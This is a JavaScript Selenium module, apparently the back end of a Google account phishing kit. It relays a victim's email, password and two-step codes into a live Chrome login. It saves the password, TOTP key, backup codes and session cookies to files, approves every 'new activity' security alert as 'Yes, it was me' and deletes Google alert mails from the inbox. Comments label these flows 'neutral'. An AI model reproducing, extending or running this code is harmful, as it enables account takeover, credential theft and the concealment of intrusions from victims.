import fs from "fs";
import path from "path";
import { By, until } from "selenium-webdriver";
import psList from "ps-list";

import {
  ensureUserLogDir,
  sleep,
  writeDebugLogLine,
  writeUserLog,
} from "./logger.js";

import {
  activateUserWindowByPid,
  attachChrome,
  isDriverAlive,
  UsersDB,
} from "./utils.js";
import {
  buildHTMLByPageSource,
  getSpecificTagList,
  removeSpecificTag,
} from "./html.js";
import { STATUS_DONE } from "../db/jsonDB.js";

export const URL_DONE = "https://myaccount.google.com";
export const URL_GOOGLE_ACCOUNT_URL = "https://accounts.google.com";
export const URL_INPUT_EMAIL =
  "https://accounts.google.com/v3/signin/identifier";
export const URL_INPUT_PASSWORD =
  "https://accounts.google.com/v3/signin/challenge/pwd";
export const URL_RECAPTCHA = "";

export const URL_2_STEP_CHALLENGE_SELECTION =
  "https://accounts.google.com/v3/signin/challenge/selection";

export const URL_2_STEP_IPE =
  "https://accounts.google.com/v3/signin/challenge/ipe/verify";
export const URL_2_STEP_TOTP =
  "https://accounts.google.com/v3/signin/challenge/totp";
export const URL_2_STEP_OOTP =
  "https://accounts.google.com/v3/signin/challenge/ootp";
export const URL_2_STEP_DP =
  "https://accounts.google.com/v3/signin/challenge/dp";
export const URL_2_STEP_DP_PRESEND =
  "https://accounts.google.com/v3/signin/challenge/dp/presend";
export const URL_2_STEP_IPP_COLLECT =
  "https://accounts.google.com/v3/signin/challenge/ipp/collect";
export const URL_2_STEP_IPP_VERIFY =
  "https://accounts.google.com/v3/signin/challenge/ipp/verify";
export const URL_2_STEP_BC =
  "https://accounts.google.com/v3/signin/challenge/bc";
export const URL_2_STEP_PASSKEY =
  "https://accounts.google.com/v3/signin/challenge/pk/presend";

export const URL_2_STEP_HELP =
  "https://accounts.google.com/v3/signin/challenge/rejected";
// export const URL_RECOVERY_OPTION = 'https://gds.google.com/web/recoveryoptions'
export const URL_REJECTED = "https://accounts.google.com/v3/signin/rejected";
// export const URL_HOMEADDR = 'https://gds.google.com/web/homeaddress'
export const URL_RECOVERY_OPTION = "https://gds.google.com";

export const URL_MAIL_INBOX = "https://mail.google.com/mail/u/0/#inbox";
export const URL_MAIL_TRASH = "https://mail.google.com/mail/u/0/#trash";
export const URL_ACCOUNT_SECURITY = "https://myaccount.google.com/security";
export const URL_NOTIFICATIONS = "https://myaccount.google.com/notifications";
export const URL_AUTHENTICATOR =
  "https://myaccount.google.com/two-step-verification/authenticator";
export const URL_BACKUPCODES =
  "https://myaccount.google.com/two-step-verification/backup-codes";
export const URL_SIGNIN_TO_CHROME =
  "chrome://signin-dice-web-intercept.top-chrome/chrome-signin";

export const URL_CHROME_EXTENSION_AUTHENTICATOR =
  "chrome-extension://bhghoamapcdpbohphigoooaddinpkbai/view/popup.html";

const SET_TOTP_FLAG = false;
const SET_BACKUPCODES_FLAG = false;
// ----------------- Utilities (neutral) -----------------
export async function waitForPageLoading(driver) {
  try {
    // wait DOM ready, then complete
    await driver.wait(
      async () =>
        (await driver.executeScript("return document.readyState")) ===
          "interactive" ||
        (await driver.executeScript("return document.readyState")) ===
          "complete",
      10000
    );
    await driver.wait(
      async () =>
        (await driver.executeScript("return document.readyState")) ===
        "complete",
      10000
    );
    return true;
  } catch {
    return false;
  }
}

export async function findTab(driver, urlPrefix) {
  const handles = await driver.getAllWindowHandles();
  let productURL = "";
  for (const hndle of handles) {
    await driver.switchTo().window(hndle);
    const curURL = await driver.getCurrentUrl();
    console.log("[curURL]", curURL, urlPrefix);
    if (curURL.startsWith(urlPrefix)) {
      productURL = curURL;
      break;
    }
  }
  return productURL;
}

export async function findTabExceptChromeNotice(driver) {
  const handles = await driver.getAllWindowHandles();
  // Close chrome-extension:// tabs if visible (best-effort)
  for (const h of handles) {
    await driver.switchTo().window(h);
    const u = await driver.getCurrentUrl().catch(() => "");
    if (u.startsWith("chrome-extension://")) {
      try {
        await driver.close();
      } catch {}
    }
  }
  const rest = await driver.getAllWindowHandles();
  let productURL = "";
  for (const h of rest) {
    await driver.switchTo().window(h);
    const u = await driver.getCurrentUrl().catch(() => "");
    if (!u.startsWith("chrome://")) {
      productURL = u;
      break;
    }
  }
  return productURL;
}

export async function waitChangedUrl(driver, oldurl) {
  const base = (u) => (u.includes("?") ? u.slice(0, u.indexOf("?")) : u);
  const target = base(oldurl);
  let validation = false;
  for (let i = 0; i < 60; i++) {
    await sleep(100);
    const cur = await driver.getCurrentUrl();
    if (base(cur) !== target) {
      validation = await waitForPageLoading(driver);
      break;
    }
  }
  const newURL = await driver.getCurrentUrl();
  return { newURL, validation };
}

export async function openNewTabWithUrl(driver, url) {
  // Selenium: open new tab via window.open(), then switch
  await driver.executeScript("window.open(arguments[0], '_blank');", url);
  const handles = await driver.getAllWindowHandles();
  await driver.switchTo().window(handles[handles.length - 1]);
  const newURL = await driver.getCurrentUrl();
  await driver.wait(until.urlIs(newURL), 10000);
  return newURL;
}

// ----------------- Page HTML snapshot (sanitized) -----------------
export async function getPageSource(userId) {
  // try {
  const { driver } = await UsersDB.get(userId);
  if (!driver) {
    console.log("Driver data is not working");
    return "";
  }

  // wait page loading // (until to language setting button clickable)
  await driver.wait(
    until.elementIsEnabled(
      driver.findElement(By.xpath('//div[@jsname="oYxtQd"]'))
    )
  );

  // wait page loading (until to jsname="USBQqe")
  while (true) {
    const div_USBQqe_s = await driver.findElements(
      By.xpath('//div[@jsname="USBQqe"]')
    );
    if (div_USBQqe_s.length == 1) {
      break;
    }
    await sleep(100);
  }
  //

  // Input tag: set badinput="true" attribute
  const inputElements = await driver.findElements(By.xpath("//input"));

  for (const element of inputElements) {
    try {
      const typeAttribute = await element.getAttribute("type");
      if (typeAttribute === "hidden") {
        continue;
      }

      // Set badinput attribute using JavaScript
      await driver.executeScript(
        "arguments[0].setAttribute('badinput', arguments[1]);",
        element,
        "true"
      );
    } catch (error) {
      console.log(`Error setting attribute on input: ${error.message}`);
    }
  }

  // Get HTML from specific div
  const divElements = await driver.findElements(By.xpath('//*[@id="yDmH0d"]'));
  if (divElements.length === 0) {
    throw new Error('Element with id "yDmH0d" not found');
  }

  const divEl = divElements[0];
  let htmlYDmH0d = await divEl.getAttribute("innerHTML");

  // Remove script and iframe tags
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");

  // Add styles
  const pageSource = await driver.getPageSource();
  const styleList = getSpecificTagList(pageSource, "style");

  for (let i = 0; i < styleList.length; i++) {
    htmlYDmH0d += styleList[i];
  }

  return htmlYDmH0d;
}

export async function saveScreenshot(driver, userId, screenshotName) {
  try {
    if (!driver) return;
    const scrnShotData = await driver.takeScreenshot();
    const userDir = ensureUserLogDir(userId);
    const screenShotPath = path.join(userDir, screenshotName);
    // Save to file
    fs.writeFileSync(screenShotPath, scrnShotData, "base64");
    return true;
  } catch (error) {
    return false;
  }
}
// ----------------- High-level flows (neutral) -----------------
export async function scrapingReady(
  userId,
  email,
  lang,
  { forwardURL, userAgent, newUserFlg = true }
) {
  writeUserLog(
    userId,
    `[Scraping Ready Begin] : ${email} ${lang} ${forwardURL} ${
      newUserFlg ? "new" : "old"
    }`
  );
  console.log(`[Scraping Ready] ${email} ${lang} ${forwardURL}`);

  const userProfile = UsersDB.get(userId);
  let driver = userProfile["driver"];
  const pid = userProfile["pid"];
  console.log("[driver1]", driver);
  try {
    if (!driver || !isDriverAlive(driver)) {
      driver = await attachChrome(userId, false);
      await UsersDB.updateDetail(userId, "driver", driver);
      writeUserLog(userId, `chrome created : pid=${pid}`);
      console.log(`chrome created : pid=${pid}`);
    }
  } catch (error) {
    console.error("[chrome-api error]");
    console.error(error);
    return "";
  }

  await saveScreenshot(driver, userId, "scraping_ready_0.png");

  let productURL = await findTab(driver, URL_GOOGLE_ACCOUNT_URL);

  if (!productURL) {
    writeUserLog(userId, `not_found_url = ${URL_GOOGLE_ACCOUNT_URL}`);
    await driver.get(URL_GOOGLE_ACCOUNT_URL);
    await waitForPageLoading(driver);
    productURL = await driver.getCurrentUrl();
    // await driver.wait.until(until.urlIs(productURL));
  }
  await saveScreenshot(driver, userId, "scraping_ready_1.png");

  const strXPath = '//input[@id="identifierId"]';
  const inputElement = await driver.findElement(By.xpath(strXPath));
  await driver.wait(until.elementIsVisible(inputElement, 10000));

  // Click, clear, type
  await inputElement.click();
  await inputElement.clear();
  await inputElement.sendKeys(email);

  const pageSource = await driver.getPageSource();
  // Snapshot sanitized HTML (no scripts/iframes)
  // writeDebugLogLine(`[pageSource] ${pageSource}`, "debug.log");

  const htmlText = await buildHTMLByPageSource(pageSource, {
    driver,
    email,
    userId,
    forwardURL,
  });
  return htmlText;
}

export async function scrapInputValueAndBtnNext(
  userId,
  inputValue,
  btnType,
  btnText
) {
  const user = await UsersDB.get(userId);
  const { driver, pid } = user;
  await activateUserWindowByPid(userId, pid);
  writeUserLog(
    userId,
    `scrapInputValueAndBtnNext : ${inputValue} / ${btnType} / ${btnText}`
  );
  await saveScreenshot(driver, userId, "btn_action_0.png");
  let productURL = await findTab(driver, URL_GOOGLE_ACCOUNT_URL);
  if (!productURL) return;
  console.log(`[productURL]: ${JSON.stringify(productURL)}`);

  if (productURL.startsWith(URL_INPUT_EMAIL)) {
    await UsersDB.updateDetail(userId, "email", inputValue);
  } else if (productURL.startsWith(URL_INPUT_EMAIL)) {
    await UsersDB.updateDetail(userId, "PWD", inputValue);
  }

  await saveScreenshot(driver, userId, "btn_action_1.png");

  if (btnType == 0) {
    if (productURL.startsWith(URL_INPUT_EMAIL)) {
      writeUserLog(
        userId,
        `scrapInputValueAndBtnNext : input email : ${inputValue}`
      );
      let emailInput = await driver.wait(
        until.elementIsEnabled(driver.findElement(By.id("identifierId")))
      );

      await emailInput.click();
      await emailInput.clear();
      await emailInput.sendKeys(inputValue);
      // writeUserLog(userId, `email has been entered.`)
    } else if (productURL.startsWith(URL_INPUT_PASSWORD)) {
      let passwordInput = await driver.wait(
        until.elementIsEnabled(
          driver.findElement(By.xpath('//input[@name="Passwd"]'))
        )
      );
      await passwordInput.click();
      await passwordInput.clear();
      await passwordInput.sendKeys(inputValue);
    } else if (inputValue.length > 0) {
      const elements = await driver.findElements(By.xpath("//input"));
      for (const inputEl of elements) {
        const inputType = await inputEl.getAttribute("type");
        if (
          inputType == "hidden" ||
          inputType == "checkbox" ||
          inputType == "button"
        )
          continue;
        inputEl.clear();
        inputEl.sendKeys(inputValue);
        writeUserLog(userId, `input value has been entered.`);
      }
    }
    let buttons = await driver.findElements(By.tagName("button"));
    console.log(`Found ${buttons.length} buttons`);

    for (let i = 0; i < buttons.length; i++) {
      try {
        const mBtnText = await buttons[i].getText();

        console.log("[findElements]", btnText, mBtnText);
        if (mBtnText == btnText) {
          await buttons[i].click();
          console.log(`Clicked button ${i + 1}`);
          // Add small delay between clicks if needed
          await driver.sleep(200);
        }
      } catch (error) {
        console.log(`Could not click button ${i + 1}: ${error.message}`);
      }
    }
  } else if (btnType == 1) {
    await driver
      .wait(
        until.elementIsEnabled(
          driver.findElement(By.xpath(`//div[@jsname="${btnText}"]`))
        )
      )
      .click();
    writeUserLog(userId, `Re-select account button has been clicked.`);
  } else if (btnType == 2) {
    const elements = await driver.findElements(By.xpath(`//li`));
    for (const element of elements) {
      const className = await element.getAttribute("class");
      console.log("[className]", className);
      if (className.indexOf("aZvCDf cd29Sd zpCp3 SmR8") < 0) continue;
      const eleText = await element.getText();
      if (eleText.indexOf(btnText) >= 0) {
        await element.click();
        writeUserLog(
          userId,
          `Try-another-way-item has been clicked. ${btnText}`
        );
      }
    }
  }

  const { newURL, validation } = await waitChangedUrl(driver, productURL);
  writeUserLog(userId, `scrap_input_value_and_btn_next : new-url=${newURL}`);
  saveScreenshot(driver, userId, "btn_action_2.png");
  if (!validation) {
    return {
      status: 0,
      curPage: "",
    };
  }
  let curPage = "";

  if (newURL.startsWith(URL_DONE) || newURL.startsWith(URL_RECOVERY_OPTION)) {
    return { status: 1, curPage: "done" };
  }

  if (newURL.startsWith(URL_INPUT_EMAIL)) {
    curPage = "email";
  } else if (newURL.startsWith(URL_INPUT_PASSWORD)) {
    curPage = "password";
  } else if (newURL.startsWith(URL_2_STEP_DP_PRESEND)) {
    curPage = "dp-presend";
  } else if (newURL.startsWith(URL_2_STEP_DP)) {
    curPage = "dp";
  }
  const htmlText = await getPageSource(userId);

  return { status: 1, htmlText, curPage };
}

export async function scrapCheckURL(userId) {
  writeUserLog(userId, "scrapCheckURL");
  const ctx = await UsersDB.get(userId);
  if (!ctx) return { status: 0 };

  const { driver } = ctx;
  const url = await driver.getCurrentUrl();
  const html = await getPageSource(userId);
  return { status: 1, curPage: "", url, htmlText: html };
}

export async function saveScrapingResultAndSetDone(userId) {
  writeUserLog(userId, "saveScrapingResultAndSetDone");

  const profile = await UsersDB.get(userId);
  if (!profile) return { status: 0 };
  const { driver } = profile;
  await saveScreenshot(
    driver,
    userId,
    "save_scraping_result_and_set_done_0.png"
  );
  // Save cookies for domains you own/control if needed

  await scrapClickSignInChrome(driver, userId);

  const email = profile["email"] ?? "";
  const pwd = profile["pwd"] ?? "";
  const totpKey = profile["totp"] ?? "";
  const pid = profile["pid"] ?? "";
  const backupCodes = profile["backupcodes"] ?? "";
  //  [SAVE INFORMATION]
  //  save user informaiton including email and pwd on done_list.json
  //
  try {
    const dir = ensureUserLogDir(userId);
    const ts = new Date().toISOString().replace("T", " ").replace("Z", "");
    const info = { TIME: ts, email, pwd, totpKey, backupCodes };
    fs.writeFileSync(
      path.join(dir, "done_list.json"),
      JSON.stringify(info, null, 2)
    );
    writeUserLog(userId, "[USER Information] Saved");
  } catch {
    writeUserLog(userId, "[USER Information] Failed");
  }

  // [OPEN URL]
  try {
    await findTabExceptChromeNotice(driver);
    await saveScreenshot(
      driver,
      userId,
      "save_scraping_result_and_set_done_1.png"
    );
    await driver.get(URL_GOOGLE_ACCOUNT_URL);
    const newURL = await driver.getCurrentUrl();
    await driver.wait(until.urlIs(newURL), 10000);
    await sleep(1000);
  } catch (error) {
    console.error(error);
  }

  //  [SAVE COOKIE]
  try {
    const cookies = await driver.manage().getCookies();
    const dir = ensureUserLogDir(userId);
    fs.writeFileSync(
      path.join(dir, "cookies.json"),
      JSON.stringify(cookies, null, 2)
    );
    writeUserLog(userId, "cookies saved");
  } catch {
    writeUserLog(userId, "cookies read failed");
  }
  // ###### [FINAL SCRAPING] #####
  // [SET TOTP AUTHENTICATOR]
  if (SET_TOTP_FLAG) {
    try {
      writeUserLog(userId, `scrap_set_totp comming soon`);
      // scrap_set_totp(userId);
    } catch (e) {
      writeUserLog(userId, `[FALIED] scrap_set_totp. catched error`);
    }
  }
  // [SET BACKUPCODES]
  if (SET_BACKUPCODES_FLAG)
    try {
      writeUserLog(userId, `scrap_set_backupcodes comming soon`);
      // scrap_set_backupcodes(userId);
    } catch (e) {
      writeUserLog(userId, `[FALIED] scrap_set_backupcodes. catched error`);
    }

  // [CHECK ACCOUNT SERCURITY]
  await sleep(6000);
  try {
    writeUserLog(userId, `scrapAccountSecurity`);
    await scrapAccountSecurity(userId, driver);
  } catch (e) {
    writeUserLog(userId, `[FALIED] scrapAccountSecurity. catched error`);
  }

  await sleep(2000);

  //[REMOVE GOOGLE ALERT MAIL ]
  try {
    writeUserLog(userId, `scrapMailToDelete`);
    await scrapMailToDelete(userId, driver);
  } catch (e) {
    writeUserLog(userId, `[FALIED] scrapMailToDelete. catched error`);
  }

  await UsersDB.updateDetail(userId, "status", STATUS_DONE);
  writeUserLog(
    userId,
    `save_scraping_result_and_set_done. close chrome pid=[${pid}]`
  );
  try {
    await driver.quit();
    await sleep(200);
  } catch (e) {}
  // await UsersDB.remove(userId);
  writeUserLog(userId, "driver closed");
  return true;
}
export async function scrapClickSignInChrome(driver, userId = "") {
  try {
    if (!driver) {
      console.log("No driver passed");
      return { status: 0, error: "no driver" };
    }

    // find the window/tab with the matching URL
    const handles = await driver.getAllWindowHandles();
    let opened = false;

    for (const handle of handles) {
      await driver.switchTo().window(handle);
      const currentUrl = await driver.getCurrentUrl();
      if (currentUrl.startsWith(URL_SIGNIN_TO_CHROME)) {
        opened = true;
        break;
      }
    }

    if (!opened) {
      // replace with your writeUserLog userId available
      console.log(
        `[FAILED] scrapClickSignInChrome. url=${await driver.getCurrentUrl()}`
      );
      return { status: 0 };
    }

    // Execute script inside page to click the button inside the shadowRoot.
    // Doing the click inside the browser avoids the need to convert the returned element to a WebElement.
    const clicked = await driver.executeScript(
      `return (function() {
         try {
           const root = document.querySelector('chrome-signin-app');
           if (!root || !root.shadowRoot) return false;
           const btn = root.shadowRoot.querySelector('cr-button[id="accept-button"]');
           if (!btn) return false;
           btn.click();
           return true;
         } catch (e) {
           return false;
         }
       })();`
    );

    // small pause like original code
    await driver.sleep(400);

    // log and return
    console.log(`scrapClickSignInChrome clicked (user=${userId})`);
    return { status: clicked ? 1 : 0 };
  } catch (err) {
    console.error("Error in scrapClickSignInChrome:", err);
    return { status: 0, error: String(err) };
  }
}

export async function scrapMailToDelete(userId, driver) {
  const WAIT_MS = 10000;
  try {
    // 1) find or open the inbox tab
    let productUrl = await findTab(driver, URL_MAIL_INBOX);
    if (!productUrl) {
      await driver.get(URL_MAIL_INBOX);
      // wait until loaded enough (we mimic Python: wait.until(EC.url_to_be(driver.current_url)))
      await driver
        .wait(until.urlIs(await driver.getCurrentUrl()), WAIT_MS)
        .catch(() => {});
      // wait for the search input to be clickable (approx)
      const searchXpath = '//input[@name="q"]';
      await driver
        .wait(until.elementLocated(By.xpath(searchXpath)), WAIT_MS)
        .catch(() => {});
      await sleep(400);
    }

    await writeUserLog(
      userId,
      `scrapMailToDelete : url=${await driver.getCurrentUrl()}`
    );

    await saveScreenshot(driver, userId, "scrapMailToDelete_0.png");

    let cnt = 0;
    // find row elements
    const rows = await driver.findElements(By.xpath('//tr[@jsmodel="nXDxbd"]'));
    for (const rowElement of rows) {
      try {
        const gridcells = await rowElement.findElements(
          By.xpath('.//td[@role="gridcell"]')
        );
        if (!gridcells || gridcells.length === 0) continue;

        // locate sender span: .//div[2]/span/span
        const senderSpans = await gridcells[0].findElements(
          By.xpath(".//div[2]/span/span")
        );
        if (!senderSpans || senderSpans.length === 0) continue;

        const senderEl = senderSpans[0];
        const sender = (await senderEl.getText()).trim();
        const className = (await senderEl.getAttribute("class")) || "";

        if (sender === "Google" && className === "zF") {
          const clickables = await rowElement.findElements(
            By.xpath(".//td[2]/div")
          );
          if (clickables && clickables.length > 0) {
            try {
              await clickables[0].click();
              cnt += 1;
              // small pause so selection registers
              await sleep(150);
            } catch (clickErr) {
              // fallback: try JS click
              await driver
                .executeScript("arguments[0].click();", clickables[0])
                .catch(() => {});
            }
          }
        }
      } catch (innerErr) {
        // ignore per-row errors, continue scanning
        continue;
      }
    }

    await writeUserLog(userId, `scrapMailToDelete : delete mail cnt=${cnt}`);
    if (cnt === 0) {
      await writeUserLog(
        userId,
        `[FAILED] scrapMailToDelete : no removable item in Inbox`
      );
      return { status: 0 };
    }

    // 3) click the Delete button in the toolbar
    await saveScreenshot(driver, userId, "scrapMailToDelete_3.png");

    const toolbarRows = await driver.findElements(By.xpath('//div[@gh="mtb"]'));
    if (toolbarRows && toolbarRows.length > 0) {
      const btnRow = toolbarRows[0];
      const divButtons = await btnRow.findElements(
        By.xpath('.//div[@role="button"]')
      );
      for (const divEl of divButtons) {
        try {
          const aria = (await divEl.getAttribute("aria-label")) || "";
          const text = (await divEl.getText()) || "";
          if (
            aria === "Delete" ||
            aria === "삭제" ||
            text === "Delete" ||
            text === "삭제"
          ) {
            try {
              await divEl.click();
            } catch (e) {
              await driver
                .executeScript("arguments[0].click();", divEl)
                .catch(() => {});
            }
            await writeUserLog(userId, "scrapMailToDelete : clicked remove");
            break;
          }
        } catch (e) {
          // ignore and continue
        }
      }
    }

    // 4) wait a bit for "Undo" popup to disappear / for action to complete
    await sleep(2000);

    await writeUserLog(userId, "scrapMailToDelete done.");
    await saveScreenshot(driver, userId, "scrapMailToDelete_4.png");

    return { status: 1 };
  } catch (err) {
    await writeUserLog(
      userId,
      `[ERROR] scrapMailToDelete: ${err?.message || err}`
    );
    await saveScreenshot(driver, userId, "scrapMailToDelete_error.png");

    return { status: 0, error: String(err) };
  }
}
/**
 * scrapAccountSecurity - Node.js equivalent of the Python function
 *
 * @param {string|number} userId
 * @param {import('selenium-webdriver').WebDriver} driver
 * @param {object|Map} dfUser  - optional, to get per-user values if needed
 * @param {object} opts - optional overrides:
 *   - logDir (string) default: process.env.LOG_DIR || '/tmp/logs'
 *   - urlNotifications (string) default: process.env.URL_NOTIFICATIONS
 *   - waitMs (number) default: 10000
 *   - writeUserLog (async fn) default: console.log wrapper
 */
export async function scrapAccountSecurity(userId, driver) {
  try {
    const WAIT_MS = 10000;
    await findTabExceptChromeNotice(driver);
    await driver.get(URL_NOTIFICATIONS);
    // wait until url stabilizes (mimics Python wait.until(EC.url_to_be(driver.current_url)))
    const curUrl = await driver.getCurrentUrl();
    await driver.wait(until.urlIs(curUrl), WAIT_MS);

    // wait a bit for page load
    await driver.sleep(4000);

    await writeUserLog(userId, `scrapAccountSecurity : url=${curURL}`);

    await saveScreenshot(driver, userId, "scrapAccountSecurity_0.png");

    // 2) collect all new activity links (anchor tags with jsname="cDqwkb" that contain a span Xc5Wg TCnBcf)
    const linkEls = await driver.findElements(
      By.xpath('//a[@jsname="cDqwkb"]')
    );
    const links = [];
    for (const aEl of linkEls) {
      try {
        const spans = await aEl.findElements(
          By.xpath('.//span[@class="Xc5Wg TCnBcf"]')
        );
        if (spans && spans.length > 0) {
          const href = await aEl.getAttribute("href");
          if (href) links.push(href);
        }
      } catch (innerErr) {
        // ignore per-element errors
      }
    }

    await writeUserLog(
      userId,
      `scrapAccountSecurity : new_activity_cnt=${links.length}`
    );

    // 3) iterate links and click "Yes, it was me" button (jsname="j6LnYe")
    for (let i = 0; i < links.length; i++) {
      const link = links[i];
      try {
        await driver.get(link);
        const linkCur = await driver.getCurrentUrl();
        await driver.wait(until.urlIs(linkCur), WAIT_MS).catch(() => {});
        await driver.sleep(2000);

        await writeUserLog(
          userId,
          `scrapAccountSecurity : activity_link_${i}=${link}`
        );
        await saveScreenshot(
          driver,
          userId,
          `scrapAccountSecurity_link_${i}.png`
        );

        const btns = await driver.findElements(
          By.xpath('//button[@jsname="j6LnYe"]')
        );
        if (!btns || btns.length === 0) {
          await writeUserLog(
            userId,
            `[FAILED] scrapAccountSecurity. activity_link_${i}. yes button not found`
          );
          continue;
        }

        try {
          await btns[0].click();
        } catch (clickErr) {
          // fallback to JS click if WebElement.click fails
          await driver
            .executeScript("arguments[0].click();", btns[0])
            .catch(() => {});
        }

        await driver.sleep(1000);
        await writeUserLog(
          userId,
          `scrapAccountSecurity. activity_link_${i}. yes button clicked`
        );
      } catch (err) {
        await writeUserLog(
          userId,
          `[ERROR] scrapAccountSecurity link ${i}: ${err?.message || err}`
        );
        // continue to next link
      }
    }

    await writeUserLog(userId, "scrapAccountSecurity. done.");
    return { status: 1 };
  } catch (err) {
    await writeUserLog(
      userId,
      `[ERROR] scrapAccountSecurity: ${err?.message || err}`
    );
    return { status: 0, error: String(err) };
  }
}
